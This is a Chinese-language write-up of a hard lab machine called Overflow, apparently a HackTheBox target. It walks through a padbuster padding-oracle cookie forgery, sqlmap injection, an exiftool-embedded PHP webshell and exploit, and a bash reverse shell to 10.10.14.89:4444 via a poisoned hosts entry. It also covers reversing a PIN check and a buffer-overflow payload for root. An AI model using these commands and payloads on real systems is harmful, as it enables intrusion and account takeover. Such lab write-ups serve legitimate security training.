# 前言

这是一台困难靶机，靶机内容主要考察了web漏洞利用，逆向，权限维持，提权等各个方面的内容，这个靶机非常适合入门逆向，并且对提升渗透思维帮助很大，我从中也获益良多。

# 解题思路

![image](https://image.3001.net/images/20220413/1649854780_6256c93ca3ff45871aed5.png!small)

# 信息收集

靶机主要开放了ssh，web和smtp服务。

![image](https://image.3001.net/images/20220413/1649832461_6256720d5132ff24e8d31.png!small)

登录web页面后发现存在注册表单，注册登录后并没有发现任何有价值的信息。

![image](https://image.3001.net/images/20220413/1649833548_6256764c9aed01bf60d46.png!small)

使用目录模糊工具fuzz目录，发现`logs.php`文件，但是显示未认证。

![image](https://image.3001.net/images/20220413/1649833620_62567694ec503f4b436b0.png!small)

![image](https://image.3001.net/images/20220413/1649833644_625676ac6cf543b058f21.png!small)

没有发现其他线索后，抓包修改cookie值，发现一个新的目录`../logout.php?err=1`

![image](https://image.3001.net/images/20220413/1649833730_62567702a4de833e59961.png!small)

跳转到这个页面后，发现可能存在填充提示攻击。

![image](https://image.3001.net/images/20220413/1649833836_6256776cedcd14f22f9f8.png!small)

# 漏洞利用

### padbuster爆破

使用padbuster对cookie进行填充提示攻击爆破。

    
    
    padbuster http://overflow.htb/home/index.php cU5G2ionAVcCQ6BDjl2Ioo24AlC20Uqx 8 -cookies auth=cU5G2ionAVcCQ6BDjl2Ioo24AlC20Uqx -encoding 0
    

![image](https://image.3001.net/images/20220413/1649834699_62567acb14682d6e3d732.png!small)

使用padbuster工具对Admin的cookie值进行爆破，得到admin账户的cookie值。

    
    
    padbuster http://overflow.htb/home/index.php cU5G2ionAVcCQ6BDjl2Ioo24AlC20Uqx 8 -cookies auth=cU5G2ionAVcCQ6BDjl2Ioo24AlC20Uqx -encoding 0 -plaintext="user=Admin"
    

![image](https://image.3001.net/images/20220413/1649834885_62567b85f066ae07cc073.png!small)

替换掉普通账户的cookie值并刷新页面，发现存在一个`Admin Panel`页面。

![image](https://image.3001.net/images/20220413/1649834955_62567bcb5c24d956a744e.png!small)

发现是一个`made simple CMS`框架，在EDB上发现了很多nDay，但是全都是基于认证后的。

![image](https://image.3001.net/images/20220413/1649835060_62567c34d256d67fbe997.png!small)

### SQL注入

无果，当点击Logs页面并查看源代码时，发现了一个新的目录文件`../config/admin_last_login.js`

![image](https://image.3001.net/images/20220413/1649835182_62567cae4dc7faa76bdc8.png!small)

访问这个js文件时，发现了一个新的url地址`http://overflow.htb/home/logs.php?name=admin`

![image](https://image.3001.net/images/20220413/1649835344_62567d5027f4f45f1700c.png!small)

通过目录扫描发现了版本文件，并发现CMS版本是`2.2.8`，在EDB查找中发现是存在SQL注入漏洞的。

![image](https://image.3001.net/images/20220413/1649835628_62567e6cb98d69c05d2f4.png!small)

![image.png](https://image.3001.net/images/20220413/1649835653_62567e85e15e2aa951031.png!small)

直接上SQLMAP，发现存在GET类型注入。

    
    
    sqlmap -u "http://overflow.htb/home/logs.php?name=admin" --cookie="auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA"
    

![image](https://image.3001.net/images/20220413/1649835694_62567eae20623cd07426c.png!small)

对数据库进行注入。

    
    
    sqlmap -u "http://overflow.htb/home/logs.php?name=admin" --cookie="auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA" --dbs
    

![image](https://image.3001.net/images/20220413/1649835824_62567f3065b33fe0939ec.png!small)

对`cmsmsdb`数据表进行注入，发现`cms_users`和`cms_siteprefs`数据表。

    
    
    sqlmap -u "http://overflow.htb/home/logs.php?name=admin" --cookie="auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA" -D cmsmsdb
    

![image.png](https://image.3001.net/images/20220413/1649835952_62567fb061dd0cffff97c.png!small)

对`cms_users`数据表的字段进行注入，发现了`admin`和`editor`账户的哈希值。

![image](https://image.3001.net/images/20220413/1649857174_6256d296a01616a32b11d.png!small)

紧接着需要对salt值进行注入，值存在于`cms_siteprefs`表中，得到盐值`6c2d17f37e226486`

![image](https://image.3001.net/images/20220413/1649857725_6256d4bd9807daa9f79e9.png!small)

得到salt值后，需要修改EDB之前的EXP对应的字段值。

![image.png](https://image.3001.net/images/20220413/1649858263_6256d6d7aee0dbdd9cb15.png!small)

结果admin账户的爆破失败，但是可以得到editor账户的明文值。

![image](https://image.3001.net/images/20220413/1649858312_6256d70849e8793246588.png!small)

### 文件上传漏洞

使用editor账号进行登录CMS，但是并没有发现能够利用成功的点。意外发现一个子域名`frvbuild-job.overflow.htb`

![image](https://image.3001.net/images/20220413/1649860919_6256e1371a2ff04b3e821.png!small)

添加进hosts文件后访问，发现又是一个表单，使用editor账户可以登录成功。

![image](https://image.3001.net/images/20220413/1649861048_6256e1b88afc1a69074b7.png!small)

在用户配置处存在一个上传点，当尝试上传PHP的webshell时，发现被过滤。

![image](https://image.3001.net/images/20220413/1649861095_6256e1e7b3e8cc8cfad92.png!small)

上传一张正常图片时，发现输出的是`exiftool`格式的内容。

![image](https://image.3001.net/images/20220413/1649861210_6256e25ad15b946f697c1.png!small)

尝试生成一个图片马并加以利用。

    
    
    exiftool -DocumentName="<h1>test<br>
    
    
    
    <?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd=(\$_REQUEST['cmd']);system(\$cmd);echo '<pre>'}__halt__compiler();?></h1>" webshell.jpg
    

![image](https://image.3001.net/images/20220413/1649861271_6256e297a07a63cca8d03.png!small)

但是发现图片上传后，被重命名了，所以没办法利用。

![image](https://image.3001.net/images/20220413/1649861784_6256e49820c28002b1d01.png!small)

最后，发现在EDB上发现exiftool工具的利用脚本，而且在MSF上也能成功找到利用脚本。

![image](https://image.3001.net/images/20220414/1649921150_6257cc7e8b7cc5a8d36e9.png!small)

需要注意的是，如果使用的是最新的kali，那么payload需要替换成`cmd/unix/reverse_netcat`，要不然不能成功接收shell。

![image](https://image.3001.net/images/20220414/1649921252_6257cce46c3ef1cb88091.png!small)

![image](https://image.3001.net/images/20220414/1649921297_6257cd1118bb47566ebac.png!small)

# 提权

### www-data提权tester

上传`linpeas.sh`脚本，发现了一个数据库密码。

![image](https://image.3001.net/images/20220414/1649921454_6257cdae1be1abd9dc149.png!small)

查看完`/etc/passwd`文件后，发现存在一个`developer`和`tester`账户，使用该密码可以成功登录developer账户。

![image](https://image.3001.net/images/20220414/1649921644_6257ce6c81c1cfb6ff7f2.png!small)

在`/opt`目录下发现一个脚本`commontask.sh`，脚本内容中出现一个不存在的域名。`taskmanage.overflow.htb`。可以尝试修改hosts文件，将域名指向到本机的ip上进行木马投毒，`task.sh`脚本的内容如下。

    
    
    bash -i >& /dev/tcp/10.10.14.89/4444 0>&1
    

![image](https://image.3001.net/images/20220414/1649921812_6257cf14876ea508169da.png!small)

开启本地http服务，接收tester账户的shell。

![image](https://image.3001.net/images/20220414/1649921899_6257cf6bceb34df30747d.png!small)

### tester提权root

因为获取到的shell终端不稳定，所以需要对tester用户做权限持久化。

![image](https://image.3001.net/images/20220414/1649922050_6257d002b541652736abf.png!small)

![image](https://image.3001.net/images/20220414/1649922064_6257d0104bf0d0c06405f.png!small)

![image](https://image.3001.net/images/20220414/1649922075_6257d01b28c5cf0094626.png!small)

![image](https://image.3001.net/images/20220414/1649922093_6257d02d70f4c2d2ad181.png!small)

我们也可以上传`linpeas.sh`脚本进行漏洞探索，但是这边手工查找到`/opt/file_encrypt`目录下存在一个文件`file_encrypt`，这个文件是拥有root权限的。

![image](https://image.3001.net/images/20220414/1649922218_6257d0aaae609cbebc091.png!small)

### 逆向工程

对这个程序进行逆向分析，定位到`check_pin`函数上，C伪代码如下。

    
    
    void check_pin(void)
    {
    	undefined local_2c[20];
    	int local_18;
    	long local_14;
    	int local_10;
    	
    	local_10 = rand();
    	local_14 = random();
    	printf("This is the code: %i, Enter the Pin: ",local_10);
    	__isoc99_scanf(&DAT_00010d1d,&local_18);
    	if(local_14 == local_18)
    	{
    		printf("name: ");
    		__isoc99_scanf(&DAT_00010c63,&local_2c);
    		puts("Thanks for checking.You can give you feedback for improves");
    	}else{
    		puts("Wrong Pin");
    	}
    	return;
    }
    

![image](https://image.3001.net/images/20220414/1649922894_6257d34e63160035d82ec.jpg!small)

不难看出代码逻辑，我们输入的值保存到`local_18`这个变量上，然后和`local_14`的变量值进行比较，而`local_14`的变量值是通过`random`函数生成的，我们定位到`random`函数后，C伪代码如下。

    
    
    long random(void)
    {
    	unit in_stack_00000004;
    	uint local_c;
    	int local_8;
    	
    	local_c = 0x6b8b4567;
    	for(local_8 = 0;local_8 < 10;local_8=local_8+1)
    	{
    		local_c = local_c * 0x59 + 0x14;
    	}
    	return local_c ^ in_stack_00000004;
    }
    

![image](https://image.3001.net/images/20220414/1649924938_6257db4a922073a0e80bf.jpg!small)

使用gdb查看程序，发现程序最后进行了异或运算，并且程序是从`0x6b8b4567`这个地址开始的。

![image](https://image.3001.net/images/20220416/1650072594_625a1c123e7be95ad5277.png!small)

![image](https://image.3001.net/images/20220416/1650072637_625a1c3d26074681b0987.png!small)

弄清楚程序，那么就可以编写利用脚本了，运行以下脚本得到PIN值`-202976456`

    
    
    #!/usr/bin/python3
    import ctypes
    local_c_initial = 0x6b8b4567
    local_c = 0x6b8b4567
    local_8 = 0
    while (local_8 <10):
    local_c = local_c * 0x59 + 0x14
    local_8 = local_8 + 1
    
    PIN = ctypes.c_int(local_c ^ local_c_initial).value 
    print(“The PIN code is: “, PIN)
    

### 缓冲区溢出漏洞

输入很多个字符，检查可能存在缓冲区溢出。

![image](https://image.3001.net/images/20220416/1650083533_625a46cdae647b062e81e.png!small)

![image](https://image.3001.net/images/20220416/1650092227_625a68c325a0077bf1173.png!small)

使用`msf-pattern_offset`识别出在44处溢出偏移量。

![image](https://image.3001.net/images/20220416/1650092495_625a69cfa9b9495bacf2b.png!small)

那么就可以使用一段字符填充点EIP寄存器从而达到溢出。

    
    
    python3 -c "print('\x41'*44+'\x5b\x58\x55\x56')"
    

![image](https://image.3001.net/images/20220416/1650093085_625a6c1d56de89ec3bff5.png!small)

那么就产生了一个新的思路，可以将passwd文件复制一份，通过这个漏洞溢出填充新的账户字段进原本的passwd文件上。

    
    
    #!/usr/bin/python3
    
    source = open('/tmp/passwd','rb').read()
    dest = open('tmp/passwd2','wb')
    
    for i in source:
        dest.write(bytes([i^0x9b]))
    

![image](https://image.3001.net/images/20220416/1650093535_625a6ddf67b0f3584cb94.png!small)

![image](https://image.3001.net/images/20220416/1650093548_625a6decdbd30c4a153c5.png!small)

